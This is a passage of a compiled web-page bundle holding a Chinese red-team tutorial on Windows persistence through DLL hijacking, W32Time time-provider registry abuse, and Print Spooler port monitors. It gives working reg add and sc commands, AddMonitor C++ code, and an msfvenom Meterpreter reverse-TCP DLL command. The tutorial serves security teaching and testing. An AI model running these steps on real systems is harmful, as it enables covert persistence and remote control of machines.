DLL\u2f42\u4ef6\uff08\u4f1a\u6839\u636eSafeDllSearchMode\u914d\u7f6e\u2f7d\u7a0d\u6709\u4e0d\u540c\uff09\u3002"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"\u7a0b\u5e8f\u6240\u5728\u2f6c\u5f55\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u52a0\u8f7d DLL \u65f6\u6240\u5728\u7684\u5f53\u524d\u2f6c\u5f55\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u7cfb\u7edf\u2f6c\u5f55\u5373 SYSTEM32 \u2f6c\u5f55\u3002"}),"\n",(0,r.jsx)(n.li,{children:"16\u4f4d\u7cfb\u7edf\u2f6c\u5f55\u5373 SYSTEM \u2f6c\u5f55\u3002"}),"\n",(0,r.jsx)(n.li,{children:"Windows\u2f6c\u5f55\u3002"}),"\n",(0,r.jsx)(n.li,{children:"PATH\u73af\u5883\u53d8\u91cf\u4e2d\u5217\u51fa\u7684\u2f6c\u5f55"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"dll\u52ab\u6301\u5c31\u53d1\u2f63\u5728\u7cfb\u7edf\u6309\u7167\u987a\u5e8f\u641c\u7d22\u8fd9\u4e9b\u7279\u5b9a\u2f6c\u5f55\u65f6\u3002\u53ea\u8981\u2fca\u5ba2\u80fd\u591f\u5c06\u6076\u610f\u7684DLL\u653e\u5728\u4f18\u5148\u4e8e\u6b63\u5e38DLL\u6240\u5728\u7684\u2f6c\u5f55\uff0c\u5c31\u80fd\u591f\u6b3a\u9a97\u7cfb\u7edf\u4f18\u5148\u52a0\u8f7d\u6076\u610fDLL\uff0c\u6765\u5b9e\u73b0\u201c\u52ab\u6301\u201d\u3002"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"\u5728win7\u53cawin7\u4ee5\u4e0a\u7cfb\u7edf\u589e\u52a0\u4e86KnownDLLs\u4fdd\u62a4\uff0c\u9700\u8981\u5728\u5982\u4e0b\u6ce8\u518c\u8868\u4e0b\u6dfb\u52a0dll\u624d\u80fd\u987a\u5229\u52ab\u6301"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SessionManager\\ExcludeFromKnownDlls\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5173\u4e8edll\u52ab\u6301\u7684\u6587\u7ae0\u6709\u5f88\u591a,\u4e5f\u9700\u8981\u53bb\u6316\u6398,\u8fd9\u91cc\u63a8\u8350\u4e00\u7bc7\u6587\u7ae0\u5165\u95e8"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"https://www.cnblogs.com/punished/p/14715771.html",children:"https://www.cnblogs.com/punished/p/14715771.html"})}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"\u65f6\u95f4\u670d\u52a1\u5668",children:"\u65f6\u95f4\u670d\u52a1\u5668"}),"\n",(0,r.jsxs)(n.p,{children:["Windows\u64cd\u4f5c\u7cfb\u7edf\u6b63\u5728\u5229\u7528\u65f6\u95f4\u63d0\u4f9b\u8005\u4f53\u7cfb\u7ed3\u6784\uff0c\u4ee5\u4fbf\u4ece\u7f51\u7edc\u4e2d\u7684\u5176\u4ed6\u7f51\u7edc\u8bbe\u5907\u6216\u5ba2\u6237\u7aef\u83b7\u53d6\u51c6\u786e\u7684\u65f6\u95f4\u6233\u3002\u65f6\u95f4\u63d0\u4f9b\u8005\u4ee5DLL\u6587\u4ef6\u7684\u5f62\u5f0f\u5b9e\u73b0\uff0c\u8be5\u6587\u4ef6\u4f4d\u4e8eSystem32\u6587\u4ef6\u5939\u4e2d\u3002Windows\u542f\u52a8\u671f\u95f4\u5c06\u542f\u52a8\u670d\u52a1",(0,r.jsx)(n.strong,{children:"W32Time"}),"\u5e76\u52a0\u8f7dw32time.dll\u3002DLL\u52a0\u8f7d\u662f\u4e00\u79cd\u5df2\u77e5\u7684\u6280\u672f\uff0c\u901a\u5e38\u4f7f\u7ea2\u961f\u653b\u51fb\u8005\u6709\u673a\u4f1a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u7531\u4e8e\u5173\u8054\u7684\u670d\u52a1\u4f1a\u5728Windows\u542f\u52a8\u671f\u95f4\u81ea\u52a8\u542f\u52a8\uff0c\u56e0\u6b64\u53ef\u4ee5\u5c06\u5176\u7528\u4f5c\u6301\u4e45\u6027\u673a\u5236\u3002\u4f46\u662f\uff0c\u6b64\u65b9\u6cd5\u9700\u8981\u7ba1\u7406\u5458\u7ea7\u522b\u7684\u7279\u6743\uff0c\u56e0\u4e3a\u6307\u5411\u65f6\u95f4\u63d0\u4f9b\u8005DLL\u6587\u4ef6\u7684\u6ce8\u518c\u8868\u9879\u5b58\u50a8\u5728HKEY_LOCAL_MACHINE\u4e2d\u3002\u6839\u636e\u7cfb\u7edf\u662f\u7528\u4f5cNTP\u670d\u52a1\u5668\u8fd8\u662fNTP\u5ba2\u6237\u7aef\uff0c\u4f7f\u7528\u4ee5\u4e0b\u4e24\u4e2a\u6ce8\u518c\u8868\u4f4d\u7f6e\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpClient\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8be5",(0,r.jsx)(n.strong,{children:"W32Time\u5c06"}),"\u8fd0\u884c\u5728Windows\u73af\u5883\u4f5c\u4e3a\u672c\u5730\u670d\u52a1\uff0c\u5b83\u662f\u901a\u8fc7svchost\u7684\u6267\u884c\u3002"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(68789).A+"",width:"1024",height:"669"})}),"\n",(0,r.jsx)(n.p,{children:"\u6076\u610fDLL\u5df2\u653e\u5165\u78c1\u76d8\u4e2d\uff0c\u5c06\u6267\u884cpayload\u3002\u5728\u547d\u4ee4\u63d0\u793a\u7b26\u4e0b\uff0c\u53ef\u4ee5\u901a\u8fc7\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u4ee5\u6307\u5411\u4efb\u610fDLL\u7684\u4f4d\u7f6e\u6765\u4fee\u6539\u65f6\u95f4\u63d0\u4f9b\u8005\u6ce8\u518c\u8868\u9879\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpClient" /v DllName /t REG_SZ /d "C:\\temp\\w32time.dll"\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(3570).A+"",width:"1024",height:"202"})}),"\n",(0,r.jsxs)(n.p,{children:["\u4ece\u6ce8\u518c\u8868\u7f16\u8f91\u5668\u4e2d\u67e5\u770b\u6ce8\u518c\u8868\u5c06\u786e\u8ba4",(0,r.jsx)(n.strong,{children:"DllName"}),"\u7684\u503c\u5df2\u66f4\u65b0\u3002"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(33277).A+"",width:"1024",height:"618"})}),"\n",(0,r.jsx)(n.p,{children:"\u8be5\u670d\u52a1\u5c06\u5728Windows\u542f\u52a8\u671f\u95f4\u542f\u52a8\uff0c\u6216\u8005\u901a\u8fc7\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u624b\u52a8\u542f\u52a8\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"sc.exe stop w32time\nsc.exe start w32time\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(25748).A+"",width:"1024",height:"596"})}),"\n",(0,r.jsx)(n.h4,{id:"\u8865\u5145\u8bf4\u660e",children:"\u8865\u5145\u8bf4\u660e"}),"\n",(0,r.jsxs)(n.p,{children:["\u4fee\u6539Windows\u65f6\u95f4\u63d0\u4f9b\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u5411SOC\u56e2\u961f\u53d1\u51fa\u8b66\u62a5\u3002\u6765\u81eaCarbon Black\u7684",(0,r.jsx)(n.a,{href:"https://twitter.com/5twenty9",children:"Scott Lundgren"}),"\u5728C\u4e2d\u5f00\u53d1\u4e86\u4e00\u79cd\u79f0\u4e3a",(0,r.jsx)(n.a,{href:"https://github.com/scottlundgren/w32time",children:"gametime"}),"\u7684\u65f6\u95f4\u63d0\u4f9b\u7a0b\u5e8f\u3002\u53ef\u4ee5\u4f7f\u7528\u6b64DLL\u6765\u5411\u64cd\u4f5c\u7cfb\u7edf\u6ce8\u518c\u65b0\u7684\u65f6\u95f4\u63d0\u4f9b\u8005\uff0c\u5e76\u5728\u5176\u4ed6\u6ce8\u518c\u8868\u9879\u4e2d\u6267\u884c\u4fee\u6539\u3002\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u6ee5\u7528\u73b0\u6709\u7684Windows\u65f6\u95f4\u63d0\u4f9b\u7a0b\u5e8f\uff0c\u800c\u8be5\u65f6\u95f4\u63d0\u4f9b\u7a0b\u5e8f\u53ef\u4ee5\u7531SOC\u76d1\u89c6\u3002Rundll32\u53ef\u7528\u4e8e\u6ce8\u518cDLL\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"Scott Lundgren\u4f7f\u7528\u4e86\u8981\u5728\u7cfb\u7edf\u4e0a\u521b\u5efa\u7684\u6ce8\u518c\u8868\u9879\u201c GameTime\u201d\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'#define GAMETIME_SVC_KEY_NAME   L"System\\\\CurrentControlSet\\\\Services\\\\W32Time\\\\TimeProviders\\\\GameTime"\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u65f6\u95f4\u63d0\u4f9b\u8005\u2013 GameTime\u6ce8\u518c\u8868\u9879",src:s(43390).A+"",width:"1024",height:"358"})}),"\n",(0,r.jsxs)(n.p,{children:["\u6839\u636eMicrosoft ",(0,r.jsx)(n.a,{href:"https://docs.microsoft.com/en-gb/windows/win32/sysinfo/creating-a-time-provider",children:"\u6587\u6863\uff0c"}),"\u65f6\u95f4\u63d0\u4f9b\u8005\u5fc5\u987b\u5b9e\u73b0\u4ee5\u4e0b\u56de\u8c03\u51fd\u6570\u3002"]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"TimeProvOpen"}),"\n",(0,r.jsx)(n.li,{children:"TimeProvCommand"}),"\n",(0,r.jsx)(n.li,{children:"TimeProvClose"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"TimeProvOpen"}),"\u7528\u4e8e\u8fd4\u56de\u63d0\u4f9b\u8005\u53e5\u67c4\uff0c",(0,r.jsx)(n.strong,{children:"TimeProvCommand"}),"\u7528\u4e8e\u5c06\u547d\u4ee4\u53d1\u9001\u5230\u65f6\u95f4\u63d0\u4f9b\u8005\uff0c\u800c",(0,r.jsx)(n.strong,{children:"TimeProvClose"}),"\u7528\u4e8e\u5173\u95ed\u65f6\u95f4\u63d0\u4f9b\u8005\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-C++",children:"HRESULT __stdcall TimeProvOpen(\n    _In_  WCHAR                *wszName,\n    _In_  TimeProvSysCallbacks *pSysCallbacks,\n    _Out_ TimeProvHandle       *phTimeProv\n)\n{\n    UNREFERENCED_PARAMETER(pSysCallbacks);\n    UNREFERENCED_PARAMETER(phTimeProv);\n\n    OutputDebugStringW(wszName);\n\n    return (HRESULT_FROM_WIN32(ERROR_NOT_CAPABLE));\n}\n\n/*\n *\n */\nHRESULT __stdcall TimeProvCommand(\n    _In_ TimeProvHandle hTimeProv,\n    _In_ TimeProvCmd    eCmd,\n    _In_ PVOID          pvArgs\n)\n{\n    UNREFERENCED_PARAMETER(hTimeProv);\n    UNREFERENCED_PARAMETER(eCmd);\n    UNREFERENCED_PARAMETER(pvArgs);\n\n    return (HRESULT_FROM_WIN32(ERROR_NOT_CAPABLE));\n}\n\n/*\n *\n */\nHRESULT __stdcall TimeProvClose(\n    _In_ TimeProvHandle hTimeProv\n)\n{\n    UNREFERENCED_PARAMETER(hTimeProv);\n\n    return (S_OK);\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u65f6\u95f4\u63d0\u4f9b\u8005\u2013\u56de\u8c03\u529f\u80fd",src:s(8966).A+"",width:"1024",height:"753"})}),"\n",(0,r.jsx)(n.p,{children:"GameTime\u63d0\u4f9b\u7a0b\u5e8f\u5c06\u5728\u7cfb\u7edf\u4e0a\u586b\u5145\u4ee5\u4e0b\u6ce8\u518c\u8868\u9879\uff0c\u56e0\u4e3a\u5b83\u4eec\u662fMicrosoft\u65f6\u95f4\u63d0\u4f9b\u7a0b\u5e8f\u89c4\u8303\u7684\u4e00\u90e8\u5206\u3002"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"DllName,"}),"\n",(0,r.jsx)(n.li,{children:"Enabled"}),"\n",(0,r.jsx)(n.li,{children:"InputProvider"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["\u8be5",(0,r.jsx)(n.strong,{children:"DLLNAME"}),"\u6307\u793a\u5305\u542b\u4f9b\u5e94\u5546\uff0c\u8be5DLL\u7684\u540d\u79f0",(0,r.jsx)(n.strong,{children:"\u542f\u7528"}),"\u4f7f\u7136\u662f\u5426\u63d0\u4f9b\u5546\u5e94\u5728\u7cfb\u7edf\u542f\u52a8\u8fc7\u7a0b\u4e2d\u542f\u52a8\u3002\u503c\u201c 1\u201d\u542f\u52a8\u7cfb\u7edf\u7684\u63d0\u4f9b\u8005\uff0c\u800c",(0,r.jsx)(n.strong,{children:"InputProvider"}),"\u6307\u793a\u63d0\u4f9b\u8005\u662f\u8f93\u5165\u8fd8\u662f\u8f93\u51fa\u3002\u6ce8\u518c\u8868\u503c\u201c 1\u201d\u8868\u793a\u5df2\u8f93\u5165\u63d0\u4f9b\u8005\u3002\u8fd9\u4e9b\u5728\u4e0b\u9762\u7684\u4ee3\u7801\u4e2d\u6307\u5b9a\uff1a"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-C++",children:'nRet = RegSetValueExW(hkTimeProvider,\n                      L"DllName",\n                      0,\n                      REG_SZ,\n                      (LPBYTE)g_wzModule,\n                      (DWORD)wcslen(g_wzModule)*sizeof(WCHAR)+sizeof(WCHAR));\nif (ERROR_SUCCESS != nRet)\n{\n    OutputError(L"RegCreateKeyExW failed", nRet);\n    goto ErrorExit;\n}\n\nnRet = RegSetValueExW(hkTimeProvider,\n                      L"Enabled",\n                      0,\n                      REG_DWORD,\n                      (LPBYTE)&dwOne,\n                      sizeof(dwOne));\nif (ERROR_SUCCESS != nRet)\n{\n    OutputError(L"RegCreateKeyExW failed", nRet);\n    goto ErrorExit;\n}\n\nnRet = RegSetValueExW(hkTimeProvider,\n                      L"InputProvider",\n                      0,\n                      REG_DWORD,\n                      (LPBYTE)&dwOne,\n                      sizeof(dwOne));\nif (ERROR_SUCCESS != nRet)\n{\n    OutputError(L"RegCreateKeyExW failed", nRet);\n    goto ErrorExit;\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u65f6\u95f4\u63d0\u4f9b\u8005\u2013\u6ce8\u518c\u8868\u9879\u503c",src:s(93240).A+"",width:"1024",height:"724"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8be5\u4ee3\u7801\u8fd8\u4f7f\u7528",(0,r.jsx)(n.strong,{children:"Deregister"}),"\u56de\u8c03\u51fd\u6570\u4ece\u7cfb\u7edf\u4e2d\u5220\u9664\u521b\u5efa\u7684\u6ce8\u518c\u8868\u9879",(0,r.jsx)(n.strong,{children:"GameTime"}),"\uff0c\u4f5c\u4e3a\u6e05\u7406\u8fc7\u7a0b\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-C++",children:'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\GameTime\nvoid CALLBACK Deregister(\n    _In_ HWND hWnd,\n    _In_ HINSTANCE hInst,\n    _In_ LPSTR pwzCmdLine,\n    _In_ int nCmdShow)\n{\n    long    nRet;\n\n    UNREFERENCED_PARAMETER(hWnd);\n    UNREFERENCED_PARAMETER(hInst);\n    UNREFERENCED_PARAMETER(pwzCmdLine);\n    UNREFERENCED_PARAMETER(nCmdShow);\n\n    OutputDebugStringW(L"Unregister\\n");\n\n    nRet = RegDeleteKeyW(HKEY_LOCAL_MACHINE, GAMETIME_SVC_KEY_NAME);\n    if (ERROR_SUCCESS != nRet)\n    {\n        OutputError(L"RegDeleteKeyW failed!", nRet);\n        goto ErrorExit;\n    }\n\nErrorExit:\n\n    return;\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u6ce8\u9500\u56de\u8c03\u529f\u80fd",src:s(92584).A+"",width:"1024",height:"688"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5b9e\u9645\u4e0a\uff0c\u53ef\u4ee5\u4f7f\u7528",(0,r.jsx)(n.strong,{children:"rundll32"}),"\u5411\u7cfb\u7edf\u6ce8\u518cDLL\uff0c\u4ee5\u4fbf\u521b\u5efa\u5173\u8054\u7684\u6ce8\u518c\u8868\u9879\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8be5\u6ce8\u518c\u8868\u9879\u5c06\u4e0e\u7cfb\u7edf\u4e00\u8d77\u542f\u7528\u65b0\u7684\u65f6\u95f4\u63d0\u4f9b\u7a0b\u5e8f\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"rundll32.exe gametime.dll,Register\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u6ce8\u518c\u65b0\u7684\u65f6\u95f4\u63d0\u4f9b\u8005",src:s(60123).A+"",width:"1024",height:"278"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5c06\u521b\u5efa\u6ce8\u518c\u8868\u9879",(0,r.jsx)(n.strong,{children:"GameTime"}),"\uff0c\u5e76\u4e14",(0,r.jsx)(n.strong,{children:"DllName"}),"\u5c06\u5305\u542bDLL\u7684\u8def\u5f84\u3002"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u65b0\u65f6\u95f4\u63d0\u4f9b\u5546\u6ce8\u518c\u8868\u9879",src:s(85957).A+"",width:"1024",height:"486"})}),"\n",(0,r.jsx)(n.p,{children:"\u518d\u6b21\u4fee\u6539\u6ce8\u518c\u8868\u4ee5\u5305\u542b\u4efb\u610fDLL\uff0c\u5c06\u5728\u670d\u52a1\u91cd\u65b0\u542f\u52a8\u671f\u95f4\u6267\u884c\u7c7b\u4f3c\u4e8eWindows\u65f6\u95f4\u63d0\u4f9b\u7a0b\u5e8f\u7684\u4ee3\u7801\u3002"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u65b0\u65f6\u95f4\u63d0\u4f9b\u5546\u6ce8\u518c\u8868\u9879\u4fee\u6539",src:s(28296).A+"",width:"1024",height:"412"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8be5",(0,r.jsx)(n.strong,{children:"\u6ce8\u9500"}),"\u529f\u80fd\u53ef\u7528\u4e8e\u5220\u9664\u6240\u6709\u76f8\u5173\u8054\u7684\u5bc6\u94a5\u548c\u7cfb\u7edf\u4e0a\u8fdb\u884c\u6e05\u7406\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"rundll32.exe gametime.dll,Deregister\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(8741).A+"",width:"1024",height:"266"})}),"\n",(0,r.jsx)(n.h3,{id:"print-spooler\u7aef\u53e3\u76d1\u89c6\u5668",children:"Print Spooler\u7aef\u53e3\u76d1\u89c6\u5668"}),"\n",(0,r.jsx)(n.p,{children:"\u540e\u53f0\u6253\u5370\u7a0b\u5e8f\u670d\u52a1\u8d1f\u8d23\u7ba1\u7406Windows\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684\u6253\u5370\u4f5c\u4e1a\u3002\u4e0e\u670d\u52a1\u7684\u4ea4\u4e92\u901a\u8fc7\u6253\u5370\u540e\u53f0\u5904\u7406\u7a0b\u5e8fAPI\u6267\u884c\uff0c**\u8be5API\u5305\u542b\u4e00\u4e2a\u51fd\u6570\uff08AddMonitor\uff09\uff0c\u53ef\u7528\u4e8e\u5b89\u88c5\u672c\u5730\u7aef\u53e3\u76d1\u89c6\u5668\u5e76\u8fde\u63a5\u914d\u7f6e\u3001\u6570\u636e\u548c\u76d1\u89c6\u5668\u6587\u4ef6\u3002**\u6b64\u51fd\u6570\u80fd\u591f\u5c06DLL\u6ce8\u5165spoolsv.exe\u8fdb\u7a0b\uff0c\u5e76\u4e14\u901a\u8fc7\u521b\u5efa\u6ce8\u518c\u8868\u9879\uff0cred team operator\u53ef\u4ee5\u5728\u7cfb\u7edf\u4e0a\u5b9e\u73b0\u6301\u4e45\u6027\u3002"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.a,{href:"https://twitter.com/silentbreaksec",children:"Brady Bloxham"}),"\u5728",(0,r.jsx)(n.a,{href:"https://www.youtube.com/watch?v=dq2Hv7J9fvk",children:"Defcon 22\u4e0a"}),"\u6f14\u793a\u4e86\u8fd9\u79cd\u6301\u4e45\u6027\u6280\u672f\u3002\u5e94\u8be5\u6ce8\u610f\u7684\u662f\uff0c\u6b64\u6280\u672f\u9700\u8981\u7ba1\u7406\u5458\u7ea7\u522b\u7684\u7279\u6743\uff0c\u5e76\u4e14DLL\u5fc5\u987b\u62d6\u653e\u5230\u78c1\u76d8\u4e0a\u3002",(0,r.jsx)(n.a,{href:"https://twitter.com/spotheplanet",children:"Mantvydas Baranauskas"}),"\u5728\u4ed6\u7684",(0,r.jsx)(n.a,{href:"https://ired.team/offensive-security/persistence/t1013-addmonitor",children:"\u7f51\u7ad9\u4e0a"}),"\u4f7f\u7528\u4e86\u4ee5\u4e0b\u4ee3\u7801\uff0c\u4f5c\u4e3a\u4ed6\u7684\u7ea2\u961f\u7b14\u8bb0\u7684\u4e00\u90e8\u5206\u3002"]}),"\n",(0,r.jsxs)(n.p,{children:["\u8be5",(0,r.jsx)(n.strong,{children:"WINDOWS.H"}),"\u62a5\u5934\u5305\u62ec",(0,r.jsx)(n.strong,{children:"Winspool.h"}),"\u8fd9\u662f\u7531\u5fae\u8f6f\u89c4\u8303\u6240\u9700\u7684\u5934\u3002\u8be5",(0,r.jsx)(n.strong,{children:"MONITOR_INFO_2"}),"\u7528\u4e8e\u6307\u5b9a\u5fc5\u8981\u7684\u76d1\u63a7\u7ec6\u8282\u662f\uff1a"]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"pName"})," //\u76d1\u89c6\u5668\u540d\u79f0"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"pEnvironment"})," //\u73af\u5883\u67b6\u6784"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"pDLLName"})," //\u76d1\u89c6\u5668DLL\u6587\u4ef6\u7684\u540d\u79f0"]}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-C++",children:'#include "Windows.h"\n\nint main() {\n    MONITOR_INFO_2 monitorInfo;\n    TCHAR env[12] = TEXT("Windows x64");\n    TCHAR name[12] = TEXT("Monitor");\n    TCHAR dll[12] = TEXT("test.dll");\n    monitorInfo.pName = name;\n    monitorInfo.pEnvironment = env;\n    monitorInfo.pDLLName = dll;\n    AddMonitor(NULL, 2, (LPBYTE)&monitorInfo);\n    return 0;\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"AddMonitor\u529f\u80fd",src:s(31341).A+"",width:"1024",height:"411"})}),"\n",(0,r.jsx)(n.p,{children:"\u7f16\u8bd1\u4ee3\u7801\u5c06\u751f\u6210\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\uff08\u5728\u672c\u4f8b\u4e2d\u4e3aMonitors.exe\uff09\uff0c\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u5c06\u5728\u7cfb\u7edf\u4e0a\u6267\u884c\u6076\u610fDLL\uff08test.dll\uff09\u7684\u6ce8\u518c\u3002Metasploit\u6846\u67b6\u53ef\u7528\u4e8e\u751f\u6210\u5c06\u670d\u52a1\u4e8eMeterpreter\u6709\u6548\u8d1f\u8f7d\u7684DLL\u6587\u4ef6\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.21 LPORT=4444 -f dll > test.dll\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8be5DLL\u5fc5\u987b\u590d\u5236\u5230System32\u6587\u4ef6\u5939\u4e0a\uff0c\u56e0\u4e3a\u6839\u636eMicrosoft ",(0,r.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/windows/win32/printdocs/addmonitor",children:"\u6587\u6863\uff0c"}),"\u8fd9\u662f",(0,r.jsx)(n.strong,{children:"AddMonitor"}),"\u51fd\u6570\u7684\u9884\u671f\u4f4d\u7f6e\uff0c\u4ee5\u4fbf\u52a0\u8f7d\u76f8\u5173\u7684DLL \u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"copy C:\\Users\\pentestlab\\Desktop\\test.dll C:\\Windows\\System32\nMonitors.exe\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(81857).A+"",width:"1024",height:"343"})}),"\n",(0,r.jsx)(n.p,{children:"Monitors.exe\u5fc5\u987b\u4e0e\u6076\u610fDLL\u4f4d\u4e8e\u540c\u4e00\u6587\u4ef6\u5939\uff08System32\uff09\u4e2d\u3002\u6267\u884c\u8be5\u6587\u4ef6\u5c06\u4e0eMeterpreter\u5efa\u7acb\u901a\u4fe1\u3002"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(99909).A+"",width:"724",height:"174"})}),"\n",(0,r.jsxs)(n.p,{children:["\u4f46\u662f\uff0c\u4e3a\u4e86\u5b9e\u73b0\u6301\u4e45\u6027\uff0c\u5728\u201c ",(0,r.jsx)(n.strong,{children:"Monitors"})," \u201d\u6ce8\u518c\u8868\u4f4d\u7f6e\u4e0b\u9700\u8981\u4e00\u4e2a\u5bc6\u94a5\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u4ee5\u4e0b\u547d\u4ee4\u5c06\u521b\u5efa\u4e00\u4e2a\u6ce8\u518c\u8868\u9879\uff0c\u8be5\u6ce8\u518c\u8868\u9879\u5c06\u5305\u542b\u503c",(0,r.jsx)(n.strong,{children:"test.dll"}),"\u3002\u4ece\u7f16\u8f91\u5668\u4e2d\u67e5\u770b\u6ce8\u518c\u8868\u5c06\u9a8c\u8bc1\u5bc6\u94a5\u662f\u5426\u5df2\u521b\u5efa\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'reg add "hklm\\system\\currentcontrolset\\control\\print\\monitors\\Pentestlab" /v "Driver" /d "test.dll" /t REG_SZ\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u7aef\u53e3\u76d1\u89c6\u5668\u2013\u6ce8\u518c\u8868\u9879",src:s(93677).A+"",width:"1024",height:"499"})}),"\n",(0,r.jsx)(n.p,{children:"\u4e0b\u6b21\u91cd\u65b0\u542f\u52a8\u65f6\uff0cspoolsv.exe\u8fdb\u7a0b\u5c06\u52a0\u8f7dMonitors\u6ce8\u518c\u8868\u9879\u4e2d\u5b58\u5728\u5e76\u5b58\u50a8\u5728Windows\u6587\u4ef6\u5939System32\u4e2d\u7684\u6240\u6709\u9a71\u52a8\u7a0b\u5e8fDLL\u6587\u4ef6\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u4e0b\u56fe\u6f14\u793a\u4e86Meterpreter\u4f1a\u8bdd\u5df2\u5efa\u7acb\u4e0ePrint 